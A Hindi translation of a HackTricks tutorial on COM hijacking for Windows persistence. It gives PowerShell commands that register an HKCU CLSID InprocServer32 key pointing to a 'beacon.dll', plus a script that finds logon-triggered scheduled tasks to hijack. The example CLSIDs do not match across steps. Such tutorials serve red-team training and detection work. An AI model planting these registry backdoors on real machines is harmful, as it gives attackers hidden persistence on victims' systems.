# COM हाइजैकिंग

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर **मुझे फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपोज़ में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>

### अस्तित्वहीन COM कंपोनेंट्स की खोज

चूंकि HKCU के मानों को उपयोगकर्ता द्वारा संशोधित किया जा सकता है, **COM हाइजैकिंग** का उपयोग **स्थायी तंत्र** के रूप में किया जा सकता है। `procmon` का उपयोग करके ऐसे COM रजिस्ट्रीज़ की खोज की जा सकती है जो मौजूद नहीं हैं और जिन्हें हमलावर स्थायी बनाने के लिए बना सकता है। फिल्टर्स:

* **RegOpenKey** ऑपरेशन्स।
* जहां _Result_ **NAME NOT FOUND** है।
* और _Path_ **InprocServer32** के साथ समाप्त होता है।

एक बार जब आपने तय कर लिया हो कि किस अस्तित्वहीन COM को आप नकली बनाना चाहते हैं, तो निम्नलिखित कमांड्स को निष्पादित करें। _सावधान रहें यदि आप ऐसे COM की नकल करने का निर्णय लेते हैं जो हर कुछ सेकंड में लोड होता है, क्योंकि वह अत्यधिक हो सकता है।_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM घटक

Windows Tasks वास्तव में Custom Triggers का उपयोग करके COM ऑब्जेक्ट्स को कॉल करते हैं। और चूंकि वे Task Scheduler के माध्यम से निष्पादित होते हैं, यह अनुमान लगाना आसान होता है कि वे कब ट्रिगर होने वाले हैं।

<pre class="language-powershell"><code class="lang-powershell"># COM CLSIDs दिखाएँ
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# नमूना आउटपुट:
<strong># Task Name:  उदाहरण
</strong># Task Path:  \Microsoft\Windows\उदाहरण\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [पिछले जैसे और...]</code></pre>

आउटपुट की जांच करते समय आप एक ऐसा चुन सकते हैं जो **हर बार जब एक उपयोगकर्ता लॉग इन करता है** उदाहरण के लिए, निष्पादित होने वाला हो।

अब CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** को **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** और HKLM और HKCU में खोजते समय, आमतौर पर आप पाएंगे कि मान HKCU में मौजूद नहीं है।
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
```markdown
फिर, आप HKCU प्रविष्टि बना सकते हैं और हर बार जब उपयोगकर्ता लॉग इन करता है, आपका बैकडोर चालू हो जाएगा।

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) के साथ AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>
```
